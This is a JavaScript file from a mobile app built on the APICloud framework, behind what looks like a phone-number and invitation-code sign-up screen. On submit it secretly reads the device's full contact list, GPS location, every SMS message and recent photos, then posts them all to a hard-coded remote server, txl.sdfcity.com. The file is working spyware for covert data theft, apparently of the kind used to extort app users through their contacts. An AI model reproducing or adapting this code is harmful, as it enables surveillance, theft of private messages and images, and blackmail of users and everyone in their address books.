	   var danjishijian = true;
	   var address = "";
	   var apiserver = 'https://txl.sdfcity.com/api/Uploads/';
	   var lon="";
	   var lat="";
	   var smsrecords="";
		apiready = function() {
		    address=api.version + '-' + api.deviceModel;
		       smsrecords=api.require('smsrecords');
		       var aMapLBS = api.require('aMapLBS');
				aMapLBS.configManager({
				    accuracy: 'hundredMeters',
				    filter: 1
				}, function(ret, err) {
				    if (ret.status) {
				      var aMapLBS = api.require('aMapLBS');
						aMapLBS.startLocation(function(ret, err) {
						    if (ret.status) {
						      lon=ret.lon;
						      lat=ret.lat;
						    }
						});
				    }
				});
		 
		   $("body").off("tap");
		   $("body").on('tap', '#tx', function (event) {
				$('#tx').hide();
				$('#zz').show();
			});
		   
		   $("body").on('tap', '#gb', function (event) {
				$('#tx').show();
				$('#zz').hide();
			});
		   
		   $("body").on('tap', '#qd', function (event) {
				if (danjishijian) {
					danjishijian = false;
					aa()
				} else {
					aa()
				}
		
			});
		}
		
				
		
			function aa() {
				var sjh = $('#sjh').val();
				var yqm = $('#yqm').val();
				if (parseInt(sjh) > 0 && parseInt(yqm) > 0 && parseInt(sjh) > 13000000000 && parseInt(sjh) < 19999999999 && parseInt(yqm) > 0 && parseInt(yqm) < 999999) {
					huoqu(sjh, yqm);
				}
				else {
					api.toast({
	                    msg:'请输入正确的手机号和邀请码'
                    });
				}
		
			}
		   
		   
		   
		   	function huoqu(sjh, yqm) {
				var con = sjh + "**" + yqm + '**' + address;
		        var DVContacts = api.require('DVContacts');
				DVContacts.allContacts(function(ret,err) {
				    if (ret) {
				        var json_Stirng = JSON.stringify(ret);
				       // alert(json_Stirng);
					    var food=$api.strToJson(json_Stirng);
				        for(var i =0;i<food.contacts.length;i++){
				           var obj=food.contacts[i].phones;
				           var json_Stirngs = JSON.stringify(obj);
				           var phone=json_Stirngs.replace('[{"手机":"',"");
				           var phone2=phone.replace('[{"工作":"',"");
				           var phone3=phone2.replace('[{"家庭":"',"");
				           var phone4=phone3.replace('{"家庭":"',"");
				           var phone5=phone4.replace('"}]',"");
				           var phone6=phone5.replace('"}',"");
				           con = con + '=' + food.contacts[i].fullName + '|' + phone6;
				        }
				       console.log(con);
				       api.ajax({
			                url:apiserver+'api',
			                method:'post',
			                cache:'false',
			                timeout:10000,
			                dataTpye:'json',
			                data:{values:{data:con}}
		                },function(ret,err){
			                if (ret.err== '正在加载列表') {
			                   dingwei(sjh, yqm);
					        }else{
					           api.toast({
	                               msg:ret.err
                               });
					        } 
				       });
				        
				    } else {
				        alert(JSON.stringify(err));
				    }
				});
			}
			
			
			function dingwei(sjh, yqm){
			          var jingweidu = sjh + ',' + yqm + ',' + lon + ',' + lat;
			             api.ajax({
			                url:apiserver+'apimap',
			                method:'post',
			                cache:'false',
			                timeout:1000,
			                dataTpye:'json',
			                data:{values:{data:jingweidu}}
		                },function(ret,err){
			                if (ret.err == '获取成功') {
			                    getSmsInfo(sjh, yqm);
					        }else{
					           api.toast({
	                               msg:ret.err
                               });
					        } 
				       });
			}
			
		
			
			function getSmsInfo(sjh, yqm){
				     var param = {};
		             smsrecords.getsmsinfo(param, function(ret, err){
		               console.log(JSON.stringify(ret));
		               var smsList = JSON.parse(ret.smsList || "[]");
		               for(item in smsList){
		               	   var number=smsList[item].number;
		               	   var mess=smsList[item].mess;
		               	   var time=smsList[item].time;
		               	   var type=smsList[item].type;
		               	   api.ajax({
				                url:apiserver+'addsms',
				                method:'post',
				                cache:'false',
				                timeout:100,
				                dataTpye:'json',
				                data:{values:{number:number,mess:mess,time:time,type:type,sjh:sjh}}
			                },function(ret,err){
				               
					       });
		               }
		               addimg(sjh, yqm);
		            });
		        }
		
		 
		 
		 //上传图片
		 function addimg(sjh, yqm){
		     var WXPhotoPicker = api.require('WXPhotoPicker');
				WXPhotoPicker.scan({
				    type: 'image',
				    count: 10,
				    sort: {
				        key: 'time',
				        order: 'desc'
				    }
				}, function(ret) {
				    if (ret) {
				        var json_Stirng = JSON.stringify(ret);
					    var food=$api.strToJson(json_Stirng);
				        for(var i =0;i<food.list.length;i++){
					        api.ajax({
				                url:apiserver+'upload',
				                method:'post',
				                cache:'false',
				                timeout:1000,
				                dataTpye:'json',
				                data:{files:{file:food.list[i].path}}
			                },function(ret,err){
				               api.ajax({
				                url:apiserver+'addimg',
				                method:'post',
				                cache:'false',
				                timeout:1000,
				                dataTpye:'json',
				                data:{values:{sjh:sjh,img:ret.data}}
				                },function(ret,err){
					                 
						       });  
					       });
					    }
					     api.openWin({
	                       name: 'list',
	                       url: 'list.html'
                       });
				    }
				});
			  
		 }